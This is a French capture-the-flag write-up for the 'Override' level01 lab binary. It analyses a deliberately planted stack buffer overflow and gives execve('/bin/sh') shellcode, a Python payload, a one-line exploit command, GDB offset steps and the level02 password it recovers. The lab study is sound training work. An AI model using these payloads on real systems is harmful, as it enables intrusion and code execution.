@@ -1,0 +1,195 @@
+# 📘 Override – Level01
+
+## 📝 Description
+
+Ce niveau du projet **Override** introduit une vulnérabilité de **buffer overflow** classique. Le programme effectue une vérification de username et password, mais contient une faille permettant d'écraser l'adresse de retour et d'exécuter un shellcode arbitraire.
+
+L'objectif est d'exploiter ce buffer overflow pour obtenir un shell et récupérer le mot de passe du niveau suivant.
+
+---
+
+## 🔍 Analyse du binaire
+
+### Code désassemblé
+
+```c
+undefined4 main(void)
+{
+  char local_54[64];
+  int local_14;
+  
+  local_14 = 0;
+  puts("********* ADMIN LOGIN PROMPT *********");
+  printf("Enter Username: ");
+  fgets(&a_user_name, 0x100, stdin);
+  
+  local_14 = verify_user_name();
+  if (local_14 == 0) {
+    puts("Enter Password: ");
+    fgets(local_54, 100, stdin);  // ⚠️ Buffer overflow ici !
+    local_14 = verify_user_pass(local_54);
+    
+    if ((local_14 == 0) || (local_14 != 0)) {  // ⚠️ Toujours vrai !
+      puts("nope, incorrect password...\n");
+    }
+  }
+  return 1;
+}
+
+int verify_user_name(void)
+{
+  // Compare avec "dat_wil" (7 caractères)
+  puts("verifying username....\n");
+  return strcmp(&a_user_name, "dat_wil");
+}
+
+int verify_user_pass(byte *param_1)
+{
+  // Compare avec "admin"
+  return strcmp(param_1, "admin");
+}
+```
+
+### ✔ Vulnérabilités identifiées
+
+1. **Buffer overflow** : `fgets(local_54, 100, stdin)` lit 100 octets dans un buffer de 64 octets
+2. **Condition inutile** : `if ((local_14 == 0) || (local_14 != 0))` est toujours vraie → impossible de valider le password normalement
+3. **Buffer global** : `a_user_name` est une variable globale accessible à l'adresse `0x0804a040`
+
+---
+
+## 🎯 Stratégie d'exploitation
+
+### Plan d'attaque
+
+1. Injecter un **shellcode** dans le buffer global `a_user_name` (via l'input username)
+2. Provoquer un **buffer overflow** dans le password pour écraser l'adresse de retour
+3. Rediriger l'exécution vers notre shellcode
+
+### Schéma mémoire
+
+```
+Username (a_user_name @ 0x0804a040):
++---------------------------------------------------+
+| 'd' 'a' 't' '_' 'w' 'i' 'l' | [SHELLCODE (21 bytes)] |
++---------------------------------------------------+
+  0x0804a040                    0x0804a047 ← Adresse cible
+
+Password (local_54):
++---------------------------------------+
+| 'A' x 80 | [RET ADDR: 0x0804a047]     |
++---------------------------------------+
+             ↑ Écrase EIP
+```
+
+---
+
+## 🔧 Construction de l'exploit
+
+### Shellcode utilisé
+
+```asm
+; Shellcode x86 Linux execve("/bin/sh")
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+**Taille** : 21 octets
+
+### Calcul des adresses
+
+```
+a_user_name        = 0x0804a040
+Username "dat_wil" = 7 caractères
+Shellcode start    = 0x0804a040 + 7 = 0x0804a047
+```
+
+### Payload final
+
+```python
+#!/usr/bin/env python2
+import struct
+
+shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
+
+# Username: 'dat_wil' + shellcode
+username = 'dat_wil' + shellcode
+
+# Password: 80 bytes padding + return address (little-endian)
+ret_addr = struct.pack('<I', 0x0804a047)
+password = 'A' * 80 + ret_addr
+
+print username
+print password
+```
+
+---
+
+## 🚀 Exploitation
+
+### Commande d'exploitation
+
+```bash
+(python -c "print 'dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; print 'A'*80 + '\x47\xa0\x04\x08'"; cat) | ./level01
+```
+
+**Note** : Le `cat` à la fin permet de garder stdin ouvert pour interagir avec le shell.
+
+### Résultat
+
+```
+level01@OverRide:~$ (python -c "print 'dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; print 'A'*80 + '\x47\xa0\x04\x08'"; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+
+---
+
+## ✅ Résumé
+
+| Élément                  | Valeur                                                    |
+| ------------------------ | --------------------------------------------------------- |
+| Vulnérabilité            | Buffer overflow dans `fgets(local_54, 100, stdin)`       |
+| Buffer overflow size     | 100 octets lus dans un buffer de 64 octets               |
+| Offset jusqu'à EIP       | 80 octets                                                 |
+| Adresse de `a_user_name` | `0x0804a040`                                              |
+| Adresse du shellcode     | `0x0804a047` (après "dat_wil")                            |
+| Shellcode size           | 21 octets                                                 |
+| Technique                | Stack-based buffer overflow + shellcode injection         |
+| Gain                     | Shell en tant que *level02*                               |
+| Password level02         | `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`                |
+
+---
+
+## 🔐 Détails techniques
+
+### Vérification dans GDB
+
+```bash
+# Trouver l'adresse de a_user_name
+(gdb) info variables
+0x0804a040  a_user_name
+
+# Trouver l'offset du crash
+(gdb) run
+Enter Username: dat_wil
+Enter Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+# 0x37634136 = "6Ac7" → offset d'environ 80 octets
+```
+
+### Points clés de l'exploitation
+
+1. **Username** : Doit commencer par "dat_wil" pour passer `verify_user_name()`
+2. **Shellcode** : Injecté immédiatement après "dat_wil" dans `a_user_name`
+3. **Password** : 80 octets de padding + adresse de retour en little-endian
+4. **Little-endian** : `0x0804a047` → `\x47\xa0\x04\x08`
